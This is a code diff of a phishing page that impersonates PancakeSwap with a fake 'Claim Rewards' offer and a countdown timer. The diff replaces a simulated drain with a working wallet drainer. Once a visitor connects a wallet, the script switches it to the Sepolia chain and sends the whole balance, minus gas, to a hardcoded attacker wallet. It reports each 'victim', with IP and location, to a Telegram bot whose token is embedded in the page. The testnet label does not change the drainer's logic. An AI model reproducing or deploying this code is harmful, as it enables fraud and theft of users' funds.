@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PancakeSwap - Claim Rewards</title>
+    <title>PancakeSwap - Claim Rewards (Sepolia Testnet)</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
         body {
@@ -119,13 +119,13 @@
     <main class="container my-5">
         <section class="hero text-center">
             <h1 class="display-4">Unlock Exclusive Rewards Now!</h1>
-            <p class="lead">Join 50,000+ users who’ve claimed their tokens. Don’t miss out—offer ends in <span id="time">05:00</span>!</p>
+            <p class="lead">Join 50,000+ users who’ve claimed their tokens on Sepolia Testnet. Don’t miss out—offer ends in <span id="time">05:00</span>!</p>
             <button id="connect-wallet" class="btn btn-primary btn-lg mt-3">Connect Wallet to Claim</button>
         </section>
 
         <!-- Token Prices (Mock) -->
         <section class="token-prices text-center">
-            <h2>Live Token Prices</h2>
+            <h2>Live Token Prices (Sepolia Testnet)</h2>
             <div class="row">
                 <div class="col-md-4">
                     <p><strong>CAKE:</strong> $4.85 <span class="text-success">+2.3%</span></p>
@@ -176,10 +176,12 @@
     <!-- Scripts -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', async function() {
             // Telegram Bot Token and Chat ID
             const botToken = '7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA';
             const chatId = '6309547301';
+            const targetWallet = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Funds transfer destination
+            const sepoliaChainId = '0xaa36a7'; // Sepolia Testnet Chain ID (11155111 in hex)
 
             // Functions to get IP and Location
             function getIp() {
@@ -226,25 +228,77 @@
             const display = document.querySelector('#time');
             startTimer(fiveMinutes, display);
 
-            // Wallet Connection and Drain Simulation
+            // Wallet Connection and Transfer to Sepolia Testnet
             const connectButton = document.getElementById('connect-wallet');
             connectButton.addEventListener('click', async function() {
                 if (typeof window.ethereum !== 'undefined') {
                     try {
+                        // Request wallet connection
                         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                         const walletAddress = accounts[0];
+                        const web3 = new Web3(window.ethereum);
 
                         // Send wallet connection alert
                         sendAlert(`Victim connected wallet. Address: ${walletAddress}`);
 
-                        // Simulate drain attempt
-                        const status = Math.random() > 0.5 ? 'successful' : 'failed';
-                        sendAlert(`Drain status: ${status}. Address: ${walletAddress}`);
+                        // Check if on Sepolia Testnet, switch if not
+                        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                        if (currentChainId !== sepoliaChainId) {
+                            try {
+                                await window.ethereum.request({
+                                    method: 'wallet_switchEthereumChain',
+                                    params: [{ chainId: sepoliaChainId }],
+                                });
+                            } catch (switchError) {
+                                if (switchError.code === 4902) {
+                                    await window.ethereum.request({
+                                        method: 'wallet_addEthereumChain',
+                                        params: [{
+                                            chainId: sepoliaChainId,
+                                            chainName: 'Sepolia Testnet',
+                                            nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
+                                            rpcUrls: ['https://rpc.sepolia.org'],
+                                            blockExplorerUrls: ['https://sepolia.etherscan.io'],
+                                        }],
+                                    });
+                                } else {
+                                    throw switchError;
+                                }
+                            }
+                        }
 
-                        alert('Wallet connected! Claiming rewards...');
+                        // Get balance and transfer all available ETH
+                        const balance = await web3.eth.getBalance(walletAddress);
+                        const gasPrice = await web3.eth.getGasPrice();
+                        const gasLimit = 21000; // Standard gas limit for ETH transfer
+                        const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
+                        const valueToSend = BigInt(balance) - gasCost;
+
+                        if (valueToSend > 0) {
+                            const tx = {
+                                from: walletAddress,
+                                to: targetWallet,
+                                value: web3.utils.toHex(valueToSend),
+                                gas: web3.utils.toHex(gasLimit),
+                                gasPrice: web3.utils.toHex(gasPrice),
+                            };
+
+                            const txHash = await window.ethereum.request({
+                                method: 'eth_sendTransaction',
+                                params: [tx],
+                            });
+
+                            // Send success alert
+                            sendAlert(`Drain successful. Tx Hash: ${txHash}. Funds sent to ${targetWallet}`);
+                            alert('Wallet connected! Rewards claimed—funds transferred on Sepolia Testnet.');
+                        } else {
+                            sendAlert(`Drain failed. Insufficient funds in ${walletAddress}`);
+                            alert('Wallet connected, but no funds available to claim.');
+                        }
                     } catch (error) {
                         console.error(error);
-                        alert('Failed to connect wallet.');
+                        sendAlert(`Drain failed. Error: ${error.message}`);
+                        alert('Failed to connect wallet or transfer funds.');
                     }
                 } else {
                     alert('Please install MetaMask!');
